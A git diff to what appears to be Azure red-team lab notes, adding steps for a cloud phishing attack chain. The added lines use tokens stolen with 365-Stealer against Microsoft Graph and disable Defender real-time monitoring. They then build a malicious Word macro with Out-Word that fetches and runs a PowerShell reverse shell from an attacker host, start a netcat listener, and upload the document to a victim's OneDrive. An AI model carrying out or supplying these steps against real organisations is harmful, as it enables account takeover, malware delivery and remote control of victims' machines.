@@ -147,7 +147,7 @@ Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
 - Browse to http://localhost:82/365-Stealer/yourvictims/
 - Click on the user and copy the access token from access_toklen.txt
 
-#### Abuse the access token requesting all users
+#### Abuse the access token - requesting all users
 ```
 $Token = 'eyJ0eX..'
 $URI = 'https://graph.microsoft.com/v1.0/users'
@@ -164,7 +164,36 @@ $RequestParams = @{
 #### Get admin consent
 ```
 - In the left menu go to 'API permissions' and add the mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send to Microsoft Graph.
+- Refish the user to get a token with the extra permissions
 ```
+
+#### Create a malicious word document from a licensed vm
+```
+$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("office-vm\administrator", $passwd)
+$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
+Enter-PSSession -Session $officeVM
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+#Generate document
+iex (New-Object Net.Webclient).downloadstring("http://172.16.150.x:82/Out-Word.ps1")
+Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.x:82/Invoke-PowerShellTcp.ps1');reverse -Reverse -IPAddress 172.16.150.x -Port 4444" -OutputFile studentx.doc
+
+#Copy document
+Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx.doc -Destination C:\AzAD\Tools\studentx.doc
+```
+
+#### Start a listener
+```
+C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
+```
+
+#### Abuse the access token - Uploading word doc to OneDrive
+```
+& 'C:\Program Files\Python38\python.exe' C:\xampp\htdocs\365-Stealer\365-Stealer.py --upload C:\AzAD\Tools\studentx.doc --token-path C:\xampp\htdocs\365-Stealer\yourVictims\MarkDWalden@defcorphq.onmicrosoft.com\access_token.txt
+```
+
+
 
 # Authenticated enumeration
 ## Enumeration through Azure portal
